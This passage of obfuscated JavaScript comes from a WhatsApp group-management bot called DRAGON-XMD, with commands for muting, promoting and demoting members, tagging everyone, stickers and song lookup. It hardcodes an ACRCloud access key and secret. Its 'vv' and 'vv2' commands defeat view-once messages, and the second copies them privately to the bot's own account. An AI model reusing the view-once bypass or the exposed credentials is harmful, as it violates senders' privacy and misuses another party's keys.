            var _0xe8f545 = _0x16f666[0x0] * '1000';
          } else {
            if (_0x16f666[0x1] == "minute") {
              var _0xe8f545 = _0x16f666[0x0] * "60000";
            } else {
              if (_0x16f666[0x1] == "hour") {
                var _0xe8f545 = _0x16f666[0x0] * "3600000";
              } else {
                if (_0x16f666[0x1] == "day") {
                  var _0xe8f545 = _0x16f666[0x0] * "86400000";
                } else {
                  return _0x459d18("*select:*\nsecond\nminute\nhour\n\n*example*\n10 second");
                }
              }
            }
          }
          _0x459d18("Countdown of " + q + " starting from now to open the group");
          setTimeout(() => {
            _0x34f9ed.groupSettingUpdate(_0x10d7a1.chat, "not_announcement");
            _0x459d18("𝗚𝗿𝗼𝘂𝗽 𝗼𝗽𝗲𝗻𝗲𝗱 𝘀𝘂𝗰𝗰𝗲𝘀𝗳𝘂𝗹𝗹𝘆 𝗯𝘆 𝗗𝗥𝗔𝗚𝗢𝗡-𝗫𝗠𝗗");
          }, _0xe8f545);
          break;
        case "close":
        case "mute":
          {
            if (!_0x10d7a1.isGroup) {
              throw group;
            }
            if (!_0xdf0d0e) {
              throw botAdmin;
            }
            if (!_0x393450) {
              throw admin;
            }
            await _0x34f9ed.groupSettingUpdate(_0x10d7a1.chat, "announcement");
            _0x10d7a1.reply("Group successfully locked!");
          }
          break;
        case "open":
        case "unmute":
          {
            if (!_0x10d7a1.isGroup) {
              throw group;
            }
            if (!_0xdf0d0e) {
              throw botAdmin;
            }
            if (!_0x393450) {
              throw admin;
            }
            await _0x34f9ed.groupSettingUpdate(_0x10d7a1.chat, "not_announcement");
            _0x10d7a1.reply("𝗚𝗿𝗼𝘂𝗽 𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆 𝗨𝗻𝗹𝗼𝗰𝗸𝗲𝗱 𝗕𝘆 𝗗𝗥𝗔𝗚𝗢𝗡-𝗫𝗠𝗗!");
          }
          break;
        case "disp-1":
          {
            if (!_0x10d7a1.isGroup) {
              throw group;
            }
            if (!_0xdf0d0e) {
              throw botAdmin;
            }
            if (!_0x393450) {
              throw admin;
            }
            await _0x34f9ed.groupToggleEphemeral(_0x10d7a1.chat, 86400);
            _0x10d7a1.reply("Dissapearing messages successfully turned on for 24hrs!");
          }
          break;
        case "promote":
          {
            if (!_0x10d7a1.isGroup) {
              throw group;
            }
            if (!_0xdf0d0e) {
              throw botAdmin;
            }
            if (!_0x393450) {
              throw admin;
            }
            if (!_0x10d7a1.quoted) {
              throw "Ttag someone with the command!";
            }
            let _0x4fccbe = _0x10d7a1.mentionedJid[0x0] ? _0x10d7a1.mentionedJid : _0x10d7a1.quoted ? [_0x10d7a1.quoted.sender] : [_0xe09539.replace(/[^0-9]/g, '') + "@s.whatsapp.net"];
            await _0x34f9ed.groupParticipantsUpdate(_0x10d7a1.chat, _0x4fccbe, "promote");
            _0x10d7a1.reply("𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆 𝗽𝗿𝗼𝗺𝗼𝘁𝗲𝗱,𝗯𝗲 𝗮 𝗵𝗮𝗿𝗱𝘄𝗼𝗿𝗸𝗶𝗻𝗴 𝗮𝗱𝗺𝗶𝗻! 🦄");
          }
          break;
        case 'demote':
          {
            if (!_0x10d7a1.isGroup) {
              throw group;
            }
            if (!_0xdf0d0e) {
              throw botAdmin;
            }
            if (!_0x393450) {
              throw admin;
            }
            if (!_0x10d7a1.quoted) {
              throw "Ttag someone with the command!";
            }
            let _0x2cc6cc = _0x10d7a1.mentionedJid[0x0] ? _0x10d7a1.mentionedJid : _0x10d7a1.quoted ? [_0x10d7a1.quoted.sender] : [_0xe09539.replace(/[^0-9]/g, '') + '@s.whatsapp.net'];
            await _0x34f9ed.groupParticipantsUpdate(_0x10d7a1.chat, _0x2cc6cc, 'demote');
            _0x10d7a1.reply("𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗴𝘂𝗹𝗹𝘆 𝗱𝗲𝗺𝗼𝘁𝗲𝗱, 𝗵𝗼𝘄 𝗱𝗼 𝘆𝗼𝘂 𝗳𝗲𝗲𝗹 𝘆𝗼𝘂 𝗮𝗿𝗲 𝗻𝗼𝘁 𝗮𝗻 𝗮𝗱𝗺𝗶𝗻! 😲");
          }
          break;
        case "disp-7":
          {
            if (!_0x10d7a1.isGroup) {
              throw group;
            }
            if (!_0xdf0d0e) {
              throw botAdmin;
            }
            if (!_0x393450) {
              throw admin;
            }
            await _0x34f9ed.groupToggleEphemeral(_0x10d7a1.chat, 604800);
            _0x10d7a1.reply("𝗗𝗶𝘀𝗮𝗽𝗽𝗲𝗮𝗿𝗶𝗻𝗴 𝗺𝗲𝘀𝘀𝗮𝗴𝗲𝘀 𝘀𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆 𝘁𝘂𝗿𝗻𝗲𝗱 𝗼𝗻 𝗳𝗼𝗿 7𝗱𝗮𝘆𝘀!");
          }
          break;
        case 'disp-90':
          {
            if (!_0x10d7a1.isGroup) {
              throw group;
            }
            if (!_0xdf0d0e) {
              throw botAdmin;
            }
            if (!_0x393450) {
              throw admin;
            }
            await _0x34f9ed.groupToggleEphemeral(_0x10d7a1.chat, 7776000);
            _0x10d7a1.reply("𝗗𝗶𝘀𝗮𝗽𝗽𝗲𝗮𝗿𝗶𝗻𝗴 𝗺𝗲𝘀𝘀𝗮𝗴𝗲𝘀 𝘀𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆 𝘁𝘂𝗿𝗻𝗲𝗱 𝗼𝗻 𝗳𝗼𝗿 90 𝗱𝗮𝘆𝘀!");
          }
          break;
        case "disp-off":
          {
            if (!_0x10d7a1.isGroup) {
              throw group;
            }
            if (!_0xdf0d0e) {
              throw botAdmin;
            }
            if (!_0x393450) {
              throw admin;
            }
            await _0x34f9ed.groupToggleEphemeral(_0x10d7a1.chat, 0x0);
            _0x10d7a1.reply("Dissapearing messages successfully turned off!");
          }
          break;
        case 'icon':
          {
            if (!_0x10d7a1.isGroup) {
              throw group;
            }
            if (!_0x393450) {
              throw admin;
            }
            if (!_0xdf0d0e) {
              throw botAdmin;
            }
            if (!_0x1a0cc5) {
              throw "Send or tag an image with the caption " + (prefix + _0x502a51);
            }
            if (!/image/.test(_0x1dbbb8)) {
              throw "Send or tag an image with the caption " + (prefix + _0x502a51);
            }
            if (/webp/.test(_0x1dbbb8)) {
              throw "Send or tag an image with the caption " + (prefix + _0x502a51);
            }
            let _0x2fedd2 = await _0x34f9ed.downloadAndSaveMediaMessage(_0x1a0cc5);
            await _0x34f9ed.updateProfilePicture(_0x10d7a1.chat, {
              'url': _0x2fedd2
            })["catch"](_0x5d69e8 => fs.unlinkSync(_0x2fedd2));
            _0x459d18("𝗚𝗿𝗼𝘂𝗽 𝗜𝗰𝗼𝗻 𝗨𝗽𝗱𝗮𝘁𝗲𝗱 𝗯𝘆 𝗗𝗥𝗔𝗚𝗢𝗡-𝗫𝗠𝗗");
          }
          break;
        case "revoke":
        case "newlink":
        case 'reset':
          {
            if (!_0x10d7a1.isGroup) {
              throw group;
            }
            if (!_0x393450) {
              throw admin;
            }
            if (!_0xdf0d0e) {
              throw botAdmin;
            }
            await _0x34f9ed.groupRevokeInvite(_0x10d7a1.chat);
            await _0x34f9ed.sendText(_0x10d7a1.chat, "Group link revoked!", _0x10d7a1);
            let _0xccec1c = await _0x34f9ed.groupInviteCode(_0x10d7a1.chat);
            _0x34f9ed.sendText(_0x10d7a1.sender, "https://chat.whatsapp.com/" + _0xccec1c + "\n\nHere is the new group link for " + _0x2274d9.subject, _0x10d7a1, {
              'detectLink': true
            });
            _0x34f9ed.sendText(_0x10d7a1.chat, "Sent you the new group link in your inbox!", _0x10d7a1);
          }
          break;
        case "delete":
        case "del":
          {
            if (!_0x10d7a1.isGroup) {
              throw group;
            }
            if (!_0xdf0d0e) {
              throw botAdmin;
            }
            if (!_0x393450) {
              throw admin;
            }
            if (!_0x10d7a1.quoted) {
              throw "No message quoted for deletion";
            }
            let {
              chat: _0x17e556,
              fromMe: _0x4421a8,
              id: _0x24b8ae,
              isBaileys: _0x3add18
            } = _0x10d7a1.quoted;
            if (_0x3add18) {
              throw "I cannot delete. Quoted message is my message or another bot message.";
            }
            _0x34f9ed.sendMessage(_0x10d7a1.chat, {
              'delete': {
                'remoteJid': _0x10d7a1.chat,
                'fromMe': false,
                'id': _0x10d7a1.quoted.id,
                'participant': _0x10d7a1.quoted.sender
              }
            });
          }
          break;
        case "leave":
          {
            if (!_0x22f9f0) {
              throw NotOwner;
            }
            if (!_0x10d7a1.isGroup) {
              throw group;
            }
            await _0x34f9ed.sendMessage(_0x10d7a1.chat, {
              'text': "𝗚𝗼𝗼𝗱𝗯𝘆𝗲 𝗲𝘃𝗲𝗿𝘆𝗼𝗻𝗲👋. 𝗗𝗥𝗔𝗚𝗢𝗡-𝗫𝗠𝗗 𝗶𝘀 𝗟𝗲𝗮𝘃𝗶𝗻𝗴 𝘁𝗵𝗲 𝗚𝗿𝗼𝘂𝗽 𝗻𝗼𝘄...",
              'mentions': _0x1d7b4.map(_0x46c09e => _0x46c09e.id)
            }, {
              'quoted': _0x10d7a1
            });
            await _0x34f9ed.groupLeave(_0x10d7a1.chat);
          }
          break;
        case "subject":
        case "changesubject":
          {
            if (!_0x10d7a1.isGroup) {
              throw group;
            }
            if (!_0xdf0d0e) {
              throw botAdmin;
            }
            if (!_0x393450) {
              throw admin;
            }
            if (!_0xe09539) {
              throw "Provide the text for the group subject.";
            }
            await _0x34f9ed.groupUpdateSubject(_0x10d7a1.chat, _0xe09539);
            _0x10d7a1.reply("Group name successfully updated! 💀");
          }
          break;
        case 'desc':
        case "setdesc":
          {
            if (!_0x10d7a1.isGroup) {
              throw group;
            }
            if (!_0xdf0d0e) {
              throw botAdmin;
            }
            if (!_0x393450) {
              throw admin;
            }
            if (!_0xe09539) {
              throw "Provide the text for the group description";
            }
            await _0x34f9ed.groupUpdateDescription(_0x10d7a1.chat, _0xe09539);
            _0x10d7a1.reply("Group description successfully updated! 🥶");
          }
          break;
        case "hidetag":
        case "tag":
          {
            if (!_0x10d7a1.isGroup) {
              throw group;
            }
            if (!_0xdf0d0e) {
              throw botAdmin;
            }
            if (!_0x393450) {
              throw admin;
            }
            _0x34f9ed.sendMessage(_0x10d7a1.chat, {
              'text': q ? q : "😅𝗕𝗹𝗶𝗻𝗱 𝗧𝗮𝗴𝘀😅",
              'mentions': _0x1d7b4.map(_0x4d962c => _0x4d962c.id)
            }, {
              'quoted': _0x10d7a1
            });
          }
          break;
        case "tagall":
          {
            if (!_0x10d7a1.isGroup) {
              throw group;
            }
            if (!_0xdf0d0e) {
              throw botAdmin;
            }
            if (!_0x393450) {
              throw admin;
            }
            let _0x2e6538 = "𝗗𝗥𝗔𝗚𝗢𝗡-𝗫𝗠𝗗 𝗶𝘀 𝗧𝗮𝗴𝗶𝗻𝗴 𝘆𝗼𝘂 𝗼𝗻 𝗯𝗲𝗵𝗮𝗹𝗳 𝗼𝗳 𝘆𝗼𝘂𝗿 𝗶𝗻𝗮𝗰𝘁𝗶𝘃𝗲 𝗹𝗼𝘃𝗲𝗿🖕😅: \n   \n  Message " + (q ? q : '') + "*\n\n";
            for (let _0x3d8bd3 of _0x1d7b4) {
              _0x2e6538 += "📧 @" + _0x3d8bd3.id.split('@')[0x0] + "\n";
            }
            _0x34f9ed.sendMessage(_0x10d7a1.chat, {
              'text': _0x2e6538,
              'mentions': _0x1d7b4.map(_0x1fa4f4 => _0x1fa4f4.id)
            }, {
              'quoted': _0x10d7a1
            });
          }
          break;
        case "whatsong":
        case "shazam":
          let _0xffe93c = new acrcloud({
            'host': "identify-eu-west-1.acrcloud.com",
            'access_key': '2631ab98e77b49509e3edcf493757300',
            'access_secret': "KKbVWlTNCL3JjxjrWnywMdvQGanyhKRN0fpQxyUo"
          });
          if (!_0x10d7a1.quoted) {
            throw "Tag a short video or audio";
          }
          let _0x47b0df = _0x10d7a1.quoted ? _0x10d7a1.quoted : _0x10d7a1;
          let _0x21f49f = (_0x47b0df.msg || _0x47b0df).mimetype || _0x47b0df.mediaType || '';
          if (/video|audio/.test(_0x21f49f)) {
            let _0xf918ae = await _0x47b0df.download();
            await _0x459d18("Analyzing the media...");
            let {
              status: _0x27e9ea,
              metadata: _0xba8a83
            } = await _0xffe93c.identify(_0xf918ae);
            if (_0x27e9ea.code !== 0x0) {
              throw _0x27e9ea.msg;
            }
            let {
              title: _0x51b9a4,
              artists: _0x5167cf,
              album: _0x23a257,
              genres: _0x41e0d2,
              release_date: _0x58b7c7
            } = _0xba8a83.music[0x0];
            let _0x173cc7 = "*• Title:* " + _0x51b9a4 + (_0x5167cf ? "\n*• Artists:* " + _0x5167cf.map(_0x28f253 => _0x28f253.name).join(", ") : '');
            _0x173cc7 += '' + (_0x23a257 ? "\n*• Album:* " + _0x23a257.name : '') + (_0x41e0d2 ? "\n*• Genres:* " + _0x41e0d2.map(_0x8e4ac5 => _0x8e4ac5.name).join(", ") : '') + "\n";
            _0x173cc7 += "*• Release Date:* " + _0x58b7c7;
            await _0x34f9ed.sendMessage(_0x10d7a1.chat, {
              'text': _0x173cc7.trim()
            }, {
              'quoted': _0x10d7a1
            });
            const {
              videos: _0x7b89df
            } = await yts(_0x51b9a4);
            if (!_0x7b89df || _0x7b89df.length <= 0x0) {
              _0x459d18("No Matching videos found for : *" + _0x16f666[0x0] + "*!!");
              return;
            }
            let _0x2dec21 = _0x7b89df[0x0].url;
            let _0x3626ca = await ytdl.getInfo(_0x2dec21);
            if (_0x3626ca.videoDetails.lengthSeconds >= 0x708) {
              _0x459d18("Too big!");
              return;
            }
            let _0x50fe21 = _0x3626ca.videoDetails.title;
            let _0x23191d = '' + Math.floor(Math.random() * 0x2710) + ".mp3";
            const _0x1fde64 = ytdl(_0x2dec21, {
              'filter': _0xcd3e5d => _0xcd3e5d.audioBitrate == 0xa0 || _0xcd3e5d.audioBitrate == 0x80
            }).pipe(fs.createWriteStream('./' + _0x23191d));
            console.log("Audio downloading ->", _0x2dec21);
            await new Promise((_0x11fa2a, _0x135081) => {
              _0x1fde64.on("error", _0x135081);
              _0x1fde64.on("finish", _0x11fa2a);
            });
            let _0x3d7d16 = fs.statSync('./' + _0x23191d);
            let _0x3658ff = _0x3d7d16.size;
            let _0xd0147 = _0x3658ff / 1048576;
            console.log("Audio downloaded ! \n Size: " + _0xd0147);
            if (_0xd0147 <= 0x28) {
              await _0x34f9ed.sendMessage(_0x5e81f5, {
                'document': fs.readFileSync('./' + _0x23191d),
                'mimetype': "audio/mpeg",
                'fileName': _0x50fe21 + ".mp3"
              }, {
                'quoted': _0x10d7a1
              });
            } else {
              _0x459d18("File size bigger.");
            }
            fs.unlinkSync('./' + _0x23191d);
          }
          break;
        case 's':
        case "sticker":
          {
            const {
              Sticker: _0x29e75d,
              createSticker: _0x1117c0,
              StickerTypes: _0x241eb0
            } = require("wa-sticker-formatter");
            if (!_0x37f12c) {
              _0x10d7a1.reply("Quote an image or a short video.");
              return;
            }
            ;
            let _0x35cb2;
            if (_0x37f12c.imageMessage) {
              _0x35cb2 = _0x37f12c.imageMessage;
            } else {
              if (_0x37f12c.videoMessage) {
                _0x35cb2 = _0x37f12c.videoMessage;
              } else {
                _0x10d7a1.reply("That is neither an image nor a short video! ");
                return;
              }
            }
            ;
            var _0x385b90 = await _0x34f9ed.downloadAndSaveMediaMessage(_0x35cb2);
            let _0x159e5f = new _0x29e75d(_0x385b90, {
              'pack': packname,
              'author': author,
              'type': _0x241eb0.FULL,
              'categories': ['🤩', '🎉'],
              'id': "12345",
              'quality': 0x46,
              'background': "transparent"
            });
            const _0x599976 = await _0x159e5f.toBuffer();
            _0x34f9ed.sendMessage(_0x10d7a1.chat, {
              'sticker': _0x599976
            }, {
              'quoted': _0x10d7a1
            });
          }
          break;
        case 'dp':
          {
            try {
              ha = _0x10d7a1.quoted.sender;
              qd = await _0x34f9ed.getName(ha);
              pp2 = await _0x34f9ed.profilePictureUrl(ha, "image");
            } catch {
              pp2 = "https://tinyurl.com/yx93l6da";
            }
            if (!_0x10d7a1.quoted) {
              throw "Tag a user!";
            }
            bar = "Profile Picture of " + qd;
            _0x34f9ed.sendMessage(_0x10d7a1.chat, {
              'image': {
                'url': pp2
              },
              'caption': bar,
              'fileLength': "999999999999"
            }, {
              'quoted': _0x10d7a1
            });
          }
          break;
        case "list":
        case "vars":
        case 'help':
          _0x459d18("𝟏 Owner➣ 𝐆𝐞𝐭 𝗗𝗿𝗮𝗴𝗼𝗻  𝐜𝐨𝐧𝐭𝐚𝐜𝐭\n\n𝟐 𝐁𝐫𝐨𝐚𝐝𝐜𝐚𝐬𝐭➣ 𝐒𝐞𝐧𝐝𝐬 𝐦𝐞𝐬𝐬𝐚𝐠𝐞 𝐭𝐨 𝐚𝐥𝐥 𝐠𝐫𝐨𝐮𝐩𝐬\n\n𝟑 𝐉𝐨𝐢𝐧➣ 𝐭𝐚𝐠 𝐠𝐫𝐨𝐮𝐩 𝐥𝐢𝐧𝐤 𝐰𝐢𝐭𝐡 𝐣𝐨𝐢𝐧\n\n𝟒 𝐛𝐨𝐭𝐩𝐩➣ 𝐂𝐡𝐚𝐧𝐠𝐞 𝐛𝐨𝐭𝐬 𝐚𝐜𝐜𝐨𝐮𝐧𝐭 𝐝𝐩\n\n𝟓 𝐁𝐥𝐨𝐜𝐤➣ 𝐁𝐥𝐨𝐜𝐤 𝐭𝐡𝐞𝐦 𝐟𝐚𝐤𝐞 𝐟𝐫𝐢𝐞𝐧𝐝𝐬\n\n𝟔 𝐊𝐢𝐥𝐥➣ 𝐊𝐢𝐥𝐥𝐬 𝐠𝐫𝐨𝐮𝐩 𝐢𝐧 𝐬𝐞𝐜𝐨𝐧𝐝𝐬\n\n𝟕 𝐔𝐧𝐛𝐥𝐨𝐜𝐤➣ 𝐆𝐢𝐯𝐞 𝐭𝐡𝐞𝐦 𝐟𝐚𝐤𝐞 𝐟𝐫𝐢𝐞𝐧𝐝𝐬 𝐚 𝐬𝐞𝐜𝐨𝐧𝐝 𝐜𝐡𝐚𝐧𝐜𝐞\n\n𝟖 𝐒𝐞𝐭𝐯𝐚𝐫➣ 𝐒𝐞𝐭 𝐯𝐚𝐫𝐬 𝐢𝐧 𝐡𝐞𝐫𝐨𝐤𝐮\n\n𝟗 𝐒𝐭𝐢𝐜𝐤𝐞𝐫➣ 𝐂𝐨𝐧𝐯𝐞𝐫𝐭𝐬 𝐚 𝐩𝐡𝐨𝐭𝐨 𝐨𝐫 𝐚 𝐬𝐡𝐨𝐫𝐭 𝐯𝐢𝐝𝐞𝐨 𝐭𝐨 𝐚 𝐬𝐭𝐢𝐜𝐤𝐞𝐫\n\n𝟏𝟎 𝐓𝐨𝐢𝐦𝐠➣ 𝐂𝐨𝐧𝐯𝐞𝐫𝐭𝐬 𝐚 𝐬𝐭𝐢𝐜𝐤𝐞𝐫 𝐭𝐨 𝐚 𝐩𝐡𝐨𝐭𝐨\n\n𝟏𝟏 𝐏𝐥𝐚𝐲➣ 𝐆𝐞𝐭 𝐲𝐨𝐮𝐫 𝐟𝐚𝐯𝐨𝐫𝐢𝐭𝐞 𝐬𝐨𝐧𝐠\n\n𝟏𝟐 𝐖𝐡𝐚𝐭𝐬𝐨𝐧𝐠➣ 𝐠𝐞𝐭 𝐭𝐡𝐞 𝐭𝐢𝐭𝐥𝐞 𝐨𝐟 𝐭𝐡𝐞 𝐬𝐨𝐧𝐠\n\n𝟏𝟑 𝐘𝐭𝐬 ➣ 𝐆𝐞𝐭 𝐘𝐨𝐮𝐓𝐮𝐛𝐞 𝐯𝐢𝐝𝐞𝐨𝐬\n\n𝟏𝟒 𝐌𝐨𝐯𝐢𝐞➣ 𝐆𝐞𝐭 𝐲𝐨𝐮𝐫 𝐟𝐚𝐯𝐨𝐫𝐢𝐭𝐞 𝐦𝐨𝐯𝐢𝐞 𝐝𝐞𝐭𝐚𝐢𝐥𝐬\n\n𝟏𝟓 𝐌𝐢𝐱➣ 𝐂𝐨𝐦𝐛𝐢𝐧𝐞𝐬 +𝟐𝐞𝐦𝐨𝐣𝐢𝐬\n\n𝟏𝟔 𝐀𝐢-𝐢𝐦𝐠➣ 𝐆𝐞𝐭 𝐚𝐧 𝐀𝐢 𝐩𝐡𝐨𝐭𝐨\n\n𝟏𝟕 𝐆𝐩𝐭 ➣ 𝐇𝐞𝐫𝐞 𝐭𝐨 𝐚𝐧𝐬𝐰𝐞𝐫 𝐲𝐨𝐮𝐫 𝐪𝐮𝐞𝐬𝐭𝐢𝐨𝐧𝐬\n\n𝟏𝟖 𝐃𝐩➣ 𝐆𝐞𝐭𝐬 𝐚 𝐩𝐞𝐫𝐬𝐨𝐧 𝐝𝐩\n\n𝟏𝟗 𝐒𝐩𝐞𝐞𝐝 ➣ 𝐂𝐡𝐞𝐜𝐤𝐬 𝐛𝐨𝐭𝐬 𝐬𝐩𝐞𝐞𝐝\n\n𝟐𝟎 𝐀𝐥𝐢𝐯𝐞➣ 𝐂𝐡𝐞𝐜𝐤 𝐰𝐡𝐞𝐭𝐡𝐞𝐫 𝐭𝐡𝐞 𝐛𝐨𝐭 𝐢𝐬 𝐬𝐭𝐢𝐥𝐥 𝐤𝐢𝐜𝐤𝐢𝐧𝐠\n\n𝟐𝟏 𝐑𝐮𝐧𝐭𝐢𝐦𝐞➣ 𝐖𝐡𝐞𝐧 𝐝𝐢𝐝 𝐛𝐨𝐭 𝐬𝐭𝐚𝐫𝐭𝐞𝐝 𝐨𝐩𝐞𝐫𝐚𝐭𝐢𝐧𝐠\n\n𝟐𝟐 𝐒𝐜𝐫𝐢𝐩𝐭➣ 𝐆𝐞𝐭 𝐛𝐨𝐭 𝐬𝐜𝐫𝐢𝐩𝐭\n\n𝟐𝟑 𝐎𝐰𝐧𝐞𝐫  ➣ 𝐆𝐞𝐭 𝐨𝐰𝐧𝐞𝐫(𝐬) 𝐜𝐨𝐧𝐭𝐚𝐜𝐭\n\n𝟐𝟒 𝐕𝐚𝐫𝐬 ➣ 𝐒𝐞𝐞 𝐚𝐥𝐥 𝐯𝐚𝐫𝐢𝐚𝐛𝐥𝐞𝐬\n\n𝟐𝟓 𝐏𝐫𝐨𝐦𝐨𝐭𝐞➣ 𝐆𝐢𝐯𝐞𝐬 𝐨𝐧𝐞 𝐚𝐝𝐦𝐢𝐧 𝐫𝐨𝐥𝐞\n\n𝟐𝟔 𝐃𝐞𝐦𝐨𝐭𝐞➣ 𝐃𝐞𝐦𝐨𝐭𝐞𝐬 𝐟𝐫𝐨𝐦 𝐠𝐫𝐨𝐮𝐩 𝐚𝐝𝐦𝐢𝐧 𝐭𝐨 𝐚 𝐦𝐞𝐦𝐛𝐞𝐫\n\n𝟐𝟕 𝐃𝐞𝐥𝐞𝐭𝐞➣ 𝐃𝐞𝐥𝐞𝐭𝐞 𝐚 𝐦𝐞𝐬𝐬𝐚𝐠𝐞\n\n𝟐𝟖 𝐑𝐞𝐦𝐨𝐯𝐞/𝐤𝐢𝐜𝐤➣ 𝐊𝐢𝐜𝐤 𝐭𝐡𝐚𝐭 𝐭𝐞𝐫𝐫𝐨𝐫𝐢𝐬𝐭 𝐟𝐫𝐨𝐦 𝐚 𝐠𝐫𝐨𝐮𝐩\n\n𝟐𝟗 𝐅𝐨𝐫𝐞𝐢𝐠𝐧𝐞𝐫𝐬➣ 𝐆𝐞𝐭 𝐟𝐨𝐫𝐞𝐢𝐠𝐧 𝐧𝐮𝐦𝐛𝐞𝐫𝐬\n\n𝟑𝟎 𝐂𝐥𝐨𝐬𝐞➣ 𝐓𝐢𝐦𝐞 𝐟𝐨𝐫 𝐠𝐫𝐨𝐮𝐩 𝐦𝐞𝐦𝐛𝐞𝐫𝐬 𝐭𝐨 𝐭𝐚𝐤𝐞 𝐚 𝐛𝐫𝐞𝐚𝐤 𝐨𝐧𝐥𝐲 𝐚𝐝𝐦𝐢𝐧𝐬 𝐜𝐚𝐧 𝐜𝐡𝐚𝐭\n\n𝟑𝟏 𝐎𝐩𝐞𝐧 ➣ 𝐄𝐯𝐞𝐫𝐲𝐨𝐧𝐞 𝐜𝐚𝐧 𝐜𝐡𝐚𝐭 𝐢𝐧 𝐚 𝐠𝐫𝐨𝐮𝐩\n\n𝟑𝟐 𝐈𝐜𝐨𝐧➣ 𝐂𝐡𝐚𝐧𝐠𝐞 𝐠𝐫𝐨𝐮𝐩 𝐢𝐜𝐨𝐧\n\n𝟑𝟑 𝐒𝐮𝐛𝐣𝐞𝐜𝐭➣ 𝐂𝐡𝐚𝐧𝐠𝐞 𝐠𝐫𝐨𝐮𝐩 𝐬𝐮𝐛𝐣𝐞𝐜𝐭\n\n𝟑𝟒 𝐃𝐞𝐬𝐜➣ 𝐆𝐞𝐭 𝐠𝐫𝐨𝐮𝐩 𝐝𝐞𝐬𝐜𝐫𝐢𝐩𝐭𝐢𝐨𝐧\n\n𝟑𝟓 𝐋𝐞𝐚𝐯𝐞➣ 𝐓𝐡𝐞 𝐠𝐫𝐨𝐮𝐩 𝐢𝐬 𝐛𝐨𝐫𝐢𝐧𝐠 ,𝐭𝐢𝐦𝐞 𝐟𝐨𝐫 𝐛𝐨𝐭 𝐭𝐨 𝐥𝐞𝐚𝐯𝐞\n\n𝟑𝟔 𝐓𝐚𝐠𝐚𝐥𝐥 ➣ 𝐓𝐚𝐠 𝐞𝐯𝐞𝐫𝐲𝐨𝐧𝐞 𝐢𝐧 𝐚 𝐠𝐫𝐨𝐮𝐩 𝐜𝐡𝐚𝐭\n\n𝟑𝟕 𝐇𝐢𝐝𝐞𝐭𝐚𝐠➣ 𝐀𝐭𝐭𝐞𝐧𝐭𝐢𝐨𝐧! 𝐀𝐭𝐭𝐞𝐧𝐭𝐢𝐨𝐧! 𝐬𝐨𝐦𝐞𝐨𝐧𝐞 𝐡𝐚𝐬 𝐬𝐨𝐦𝐞𝐭𝐡𝐢𝐧𝐠 𝐭𝐨 𝐬𝐚𝐲\n\n𝟑𝟖 𝐑𝐞𝐯𝐨𝐤𝐞 ➣ 𝐑𝐞𝐬𝐞𝐭 𝐠𝐫𝐨𝐮𝐩 𝐥𝐢𝐧𝐤");
          break;
        case 'vv':
        case "retrieve":
          {
            if (!_0x10d7a1.quoted) {
              return _0x10d7a1.reply("quote a viewonce message eh");
            }
            const _0x84461b = _0x10d7a1.msg?.['contextInfo']?.['quotedMessage'];
            if (_0x84461b.imageMessage) {
              let _0x195037 = _0x84461b.imageMessage.caption;
              let _0x584766 = await _0x34f9ed.downloadAndSaveMediaMessage(_0x84461b.imageMessage);
              _0x34f9ed.sendMessage(_0x10d7a1.chat, {
                'image': {
                  'url': _0x584766
                },
                'caption': "Retrieved by DRAGON-XMD!\n" + _0x195037
              }, {
                'quoted': _0x10d7a1
              });
            }
            if (_0x84461b.videoMessage) {
              let _0x2cdb26 = _0x84461b.videoMessage.caption;
              let _0x7eaca3 = await _0x34f9ed.downloadAndSaveMediaMessage(_0x84461b.videoMessage);
              _0x34f9ed.sendMessage(_0x10d7a1.chat, {
                'video': {
                  'url': _0x7eaca3
                },
                'caption': "Retrieved by DRAGON-XMD!\n" + _0x2cdb26
              }, {
                'quoted': _0x10d7a1
              });
            }
          }
          break;
        case "vv2":
        case "wah":
          {
            if (!_0x10d7a1.quoted) {
              return _0x10d7a1.reply("quote a viewonce message eh");
            }
            const _0x35035c = _0x10d7a1.msg?.["contextInfo"]?.['quotedMessage'];
            if (_0x35035c.imageMessage) {
              let _0x58e17b = _0x35035c.imageMessage.caption;
              let _0x259b84 = await _0x34f9ed.downloadAndSaveMediaMessage(_0x35035c.imageMessage);
              _0x34f9ed.sendMessage(_0x34f9ed.user.id, {
                'image': {
                  'url': _0x259b84
                },
                'caption': "Retrieved by DRAGON-XMD!\n" + _0x58e17b
              }, {
                'quoted': _0x10d7a1
              });
            }
            if (_0x35035c.videoMessage) {
              let _0x122651 = _0x35035c.videoMessage.caption;
              let _0x3308ca = await _0x34f9ed.downloadAndSaveMediaMessage(_0x35035c.videoMessage);
              _0x34f9ed.sendMessage(_0x34f9ed.user.id, {
                'video': {
                  'url': _0x3308ca
                },
                'caption': "Retrieved by DRAGON-XMD!\n" + _0x122651
              }, {
                'quoted': _0x10d7a1
              });
            }
          }
          break;
        case "take":
          {
            const {
              Sticker: _0x2eacb4,
              createSticker: _0x17b1f3,
              StickerTypes: _0x4bce07
            } = require("wa-sticker-formatter");
            if (!_0x37f12c) {
              _0x10d7a1.reply("Quote an image, a short video or a sticker to change watermark.");
              return;
            }
            ;
            let _0x29ef08;
            if (_0x37f12c.imageMessage) {
              _0x29ef08 = _0x37f12c.imageMessage;
            } else {
              if (_0x37f12c.videoMessage) {
                _0x29ef08 = _0x37f12c.videoMessage;
              } else {
                if (_0x37f12c.stickerMessage) {
                  _0x29ef08 = _0x37f12c.stickerMessage;
                } else {
                  _0x10d7a1.reply("This is neither a sticker, image nor a video...");
                  return;
                }
              }
            }
            ;
            var _0x385b90 = await _0x34f9ed.downloadAndSaveMediaMessage(_0x29ef08);
            let _0x332794 = new _0x2eacb4(_0x385b90, {
              'pack': _0x1b6245,
              'author': _0x1b6245,
              'type': _0x4bce07.FULL,
              'categories': ['🤩', '🎉'],
              'id': "12345",
              'quality': 0x46,
              'background': "transparent"
            });
            const _0x55cb48 = await _0x332794.toBuffer();
            _0x34f9ed.sendMessage(_0x10d7a1.chat, {
              'sticker': _0x55cb48
            }, {
              'quoted': _0x10d7a1
            });
          }
          break;
        case "song2":
          {
            const _0x56f667 = require("yt-search");
            const _0x350801 = require('node-fetch');
            const _0x5598dd = async _0x3d5dad => {
              const _0x5a72b8 = await _0x350801(_0x3d5dad);
